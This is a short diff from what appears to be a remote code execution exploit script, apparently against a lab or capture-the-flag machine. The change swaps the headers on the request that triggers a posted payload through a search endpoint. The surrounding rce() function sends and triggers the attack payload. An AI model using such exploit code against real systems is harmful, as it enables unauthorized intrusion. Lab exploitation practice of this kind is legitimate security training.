@@ -243,7 +243,7 @@ def rce(port1, port2):
     fwritexsl(port2)
     log("Sending first payload...")
     s.post(ticket, payload, headers=header2)
-    s.get("http://10.10.10.186:9001/search.php?search=TKT-" + random, headers=header)
+    s.get("http://10.10.10.186:9001/search.php?search=TKT-" + random, headers=header2)
     log("Payload successfully triggered...")
 
 
